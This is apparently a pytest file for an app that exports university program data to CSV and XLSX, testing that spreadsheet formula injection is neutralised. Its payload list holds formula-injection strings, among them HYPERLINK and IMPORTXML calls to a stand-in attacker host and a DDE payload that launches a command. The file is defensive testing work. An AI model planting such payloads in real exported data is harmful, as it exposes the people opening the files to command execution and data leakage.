"""Exported cells must not become spreadsheet formulas.

Every string in an export originates on a university web page, which is
untrusted input. A scholarship named `=HYPERLINK("http://attacker","Click")`
lands in a cell, and the counselor who opens the file in Excel or Numbers
executes it. `=cmd|'/c calc'!A0` is the same trick aimed at DDE.

The rule: a cell that would be read as a formula is neutralised, and the text
a human reads stays the same.
"""

from __future__ import annotations

import csv
import io

import pytest

from app.export.tabular import neutralise_formula, to_csv, to_xlsx
from app.schemas.result import ProgramResult

#: The leading characters spreadsheet software treats as "this is a formula".
DANGEROUS = ("=", "+", "-", "@", "\t", "\r")

PAYLOADS = [
    '=HYPERLINK("http://attacker.test/steal","Click me")',
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "=cmd|'/c calc'!A0",
    "\t=1+1",
    "\r=1+1",
    '=IMPORTXML("http://attacker.test","//a")',
]


class TestNeutralisation:
    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_a_formula_is_not_left_executable(self, payload):
        out = neutralise_formula(payload)
        assert not out.startswith(DANGEROUS), f"{out!r} still starts a formula"

    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_the_original_text_is_still_readable(self, payload):
        """Neutralising must not destroy the evidence. The reader still has to
        be able to see what the page said."""
        assert payload.strip() in neutralise_formula(payload)

    @pytest.mark.parametrize("ordinary", [
        "BSc Computer Science",
        "€15,000 per year",
        "2027-05-01",
        "IELTS 6.5 (writing 6.0)",
        "Delft University of Technology",
        "",
        "A-levels: AAB",
        "Tuition: 15000",
    ])
    def test_ordinary_values_are_untouched(self, ordinary):
        assert neutralise_formula(ordinary) == ordinary

    def test_a_negative_number_is_not_mistaken_for_a_formula(self):
        """A real negative number must survive as itself, or a funding gap
        would be corrupted by the very defence protecting it."""
        assert neutralise_formula("-1500") == "-1500"
        assert neutralise_formula("-1500.50") == "-1500.50"


def result_with(name: str) -> ProgramResult:
    return ProgramResult(
        id="r1", run_id="run1", university=name, university_id="u1",
        country="Netherlands", city="Delft", program=name, degree="bachelor",
        intake="Fall 2027",
    )


class TestCsvExport:
    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_no_exported_cell_starts_a_formula(self, payload):
        text = to_csv([result_with(payload)])
        rows = list(csv.reader(io.StringIO(text)))
        offenders = [
            cell for row in rows for cell in row
            if cell.startswith(DANGEROUS) and not cell.startswith("# ")
        ]
        assert not offenders, f"executable cells in the CSV: {offenders!r}"

    def test_the_disclaimer_row_is_still_present(self):
        """The CSV writer quotes the cell, so the line starts with a quote."""
        first = next(csv.reader(io.StringIO(to_csv([result_with("BSc CS")]))))
        assert first[0].startswith("# ")


class TestXlsxExport:
    @pytest.mark.parametrize("payload", PAYLOADS[:4])
    def test_no_worksheet_cell_starts_a_formula(self, payload):
        import openpyxl

        book = openpyxl.load_workbook(io.BytesIO(to_xlsx([result_with(payload)])))
        offenders = [
            cell.value
            for sheet in book.worksheets
            for row in sheet.iter_rows()
            for cell in row
            if isinstance(cell.value, str)
            and cell.value.startswith(DANGEROUS)
            and not cell.value.startswith("# ")
        ]
        assert not offenders, f"executable cells in the workbook: {offenders!r}"
